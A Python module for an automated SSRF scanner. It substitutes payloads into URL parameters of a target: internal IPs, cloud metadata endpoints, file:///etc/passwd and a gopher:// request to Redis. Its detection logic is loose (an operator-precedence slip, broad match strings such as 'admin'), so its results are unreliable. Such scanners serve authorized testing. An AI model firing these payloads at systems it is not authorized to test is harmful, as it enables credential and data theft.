"""OWASP A10: SSRF - Production Grade Scanner.

Detects:
- Internal/Private address fetching (SSRF classic)
- Cloud metadata endpoints
- Protocol smuggling (file://, gopher://, etc)
"""

import asyncio
import re
from urllib.parse import urljoin
from typing import List, Dict
from loguru import logger
class SSRFScanner:
    """Advanced Server-Side Request Forgery (SSRF) scanner."""
    def __init__(self, async_scanner, config: Dict = None):
        self.scanner = async_scanner
        self.config = config or {}
        self.results = []
    async def scan(self, target: str, recon_data: Dict = None) -> List[Dict]:
        logger.info("[A10] Starting SSRF scan")
        await asyncio.gather(
            self._test_internal_network(target),
            self._test_cloud_metadata(target),
            self._test_protocol_smuggle(target),
        )
        logger.success(f"[A10] Scan complete: {len(self.results)} vulnerabilities found")
        return self.results
    async def _test_internal_network(self, target:str):
        logger.info("[A10:Internal] Testing for internal network SSRF vectors")
        ssrf_payloads = [
            'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0',
            'http://[::1]', 'http://169.254.169.254', 'http://10.0.0.1',
            'http://192.168.1.1', 'http://172.16.0.1', 'http://172.31.255.255'
        ]
        params = ['url','next','data','dest','redirect','source','load','to','domain']
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(target)
        qs = parse_qs(parsed.query)
        for param in qs or params:
            for payload in ssrf_payloads:
                q = qs.copy()
                q[param] = [payload]
                new_query = urlencode(q, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                response = await self.scanner.fetch(test_url)
                if response and any(s in response['content'] for s in ['localhost','127.0.0.1','root:x','admin']):
                    self.results.append({
                        'type': 'SSRF: Internal',
                        'url': test_url,
                        'severity': 'critical',
                        'evidence': f'SSRF with {payload}',
                        'confidence': 0.85,
                        'cvss_score': 9.8,
                        'remediation': 'Block SSRF via allow-lists, block internal address ranges.'
                    })
                    logger.critical(f"[A10] SSRF internal found: {test_url}")
    async def _test_cloud_metadata(self, target:str):
        logger.info("[A10:CloudMeta] Testing for cloud metadata SSRF vectors")
        endpoints = [
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://169.254.169.254/computeMetadata/v1/',  # GCP
            'http://169.254.169.254/metadata/instance?api-version=2019-03-11',  # Azure
        ]
        for ep in endpoints:
            payload = ep
            url = f'{target}?url={payload}'
            resp = await self.scanner.fetch(url)
            if resp and 'ami-id' in resp['content'] or 'compute' in resp['content'] or 'instance' in resp['content']:
                self.results.append({
                    'type': 'SSRF: Cloud Metadata',
                    'url': url,
                    'severity': 'critical',
                    'evidence': f'Cloud metadata exfiltration: {payload}',
                    'confidence': 0.9,
                    'cvss_score': 10.0,
                    'remediation': 'Deny server-side http requests to metadata IPs.'
                })
                logger.critical(f"[A10] SSRF cloud found: {url}")
    async def _test_protocol_smuggle(self, target:str):
        logger.info("[A10:Proto] Testing for SSRF via protocol smuggling")
        params = ['url','next','data']
        proto_payloads = [
            'file:///etc/passwd',
            'gopher://127.0.0.1:6379/_INFO\r\n',
            'dict://localhost:2628/hello',
            'http://localhost:8080',
        ]
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(target)
        qs = parse_qs(parsed.query)
        for proto in proto_payloads:
            for param in params:
                q = qs.copy()
                q[param] = [proto]
                new_query = urlencode(q, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                response = await self.scanner.fetch(test_url)
                if response and any(s in response['content'] for s in ['root:x', 'gopher', 'dict', 'localhost']):
                    self.results.append({
                        'type': 'SSRF: Protocol Smuggle',
                        'url': test_url,
                        'severity': 'high',
                        'evidence': f'SSRF protocol smuggling: {proto}',
                        'confidence': 0.75,
                        'cvss_score': 9.0,
                        'remediation': 'Sanitize input parameters, block dangerous schemes.'
                    })
                    logger.warning(f"[A10] SSRF protocol smuggle found: {test_url}")
